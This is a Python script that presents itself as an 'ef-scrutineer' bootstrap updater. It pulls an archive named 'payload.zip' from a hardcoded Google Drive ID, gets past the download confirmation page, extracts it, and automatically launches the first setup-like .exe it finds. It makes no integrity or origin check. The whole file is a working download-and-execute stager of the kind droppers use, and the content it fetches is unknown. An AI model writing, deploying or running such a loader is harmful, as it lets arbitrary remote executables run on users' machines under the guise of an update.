import os
import os
import re
import sys
import shutil
import tempfile
import urllib.request
import http.cookiejar as cookiejar
from pathlib import Path
import zipfile


DRIVE_ID = os.getenv("EF_SCRUTINEER_DRIVE_ID", "1Lwp_TtjGY0tHmF91PfCt8GoyLKGeKi28")  # env override
DRIVE_BASE = "https://drive.google.com/uc?export=download&id={id}"


def download_gdrive(file_id: str, dest: Path) -> bool:
    base = "https://drive.google.com/uc?export=download"
    params = f"id={file_id}"
    url1 = f"{base}&{params}"
    headers = {"User-Agent": "ef-scrutineer-bootstrap"}
    tmp = dest.with_suffix(".part")
    try:
        cj = cookiejar.CookieJar()
        opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))
        req1 = urllib.request.Request(url1, headers=headers)
        with opener.open(req1, timeout=60) as resp1:
            data = resp1.read().decode("utf-8", errors="replace")
        # Look for a confirm link or token
        url2 = url1
        m = re.search(r'href=\"(/uc\?export=download[^\"]+)\"', data)
        if m:
            # Prefer direct href if found
            href = m.group(1).replace("&amp;", "&")
            url2 = "https://drive.google.com" + href
        else:
            m = re.search(r"confirm=([0-9A-Za-z_]+)", data)
            confirm = m.group(1) if m else None
            if confirm:
                url2 = f"{base}&confirm={confirm}&{params}"
        req2 = urllib.request.Request(url2, headers=headers)
        with opener.open(req2, timeout=1800) as resp2, open(tmp, "wb") as f:
            while True:
                chunk = resp2.read(1024 * 1024)
                if not chunk:
                    break
                f.write(chunk)
        tmp.replace(dest)
        return True
    except Exception:
        try:
            if tmp.exists():
                tmp.unlink()
        except Exception:
            pass
        return False


def main() -> int:
    # Download to temp
    tmpdir = Path(tempfile.gettempdir()) / "efdrift_update"
    try:
        shutil.rmtree(tmpdir, ignore_errors=True)
    except Exception:
        pass
    tmpdir.mkdir(parents=True, exist_ok=True)
    pkg = tmpdir / "payload.zip"
    file_id = os.getenv('EF_SCRUTINEER_DRIVE_ID', DRIVE_ID).strip()
    ok = download_gdrive(file_id, pkg)
    if not ok:
        return 2
    # If zip, extract and run installer/app
    target = None
    try:
        with zipfile.ZipFile(pkg, "r") as z:
            z.extractall(tmpdir)
        # Find installer-like exe
        candidates = list(tmpdir.rglob("*.exe"))
        for p in candidates:
            n = p.name.lower()
            if "setup" in n or "installer" in n:
                target = p
                break
        if target is None and candidates:
            target = candidates[0]
    except Exception:
        # Not a zip; try to run directly
        target = pkg
    if target is None or not target.exists():
        return 3
    try:
        os.startfile(str(target))  # type: ignore[attr-defined]
    except Exception:
        return 4
    return 0


if __name__ == "__main__":
    sys.exit(main())
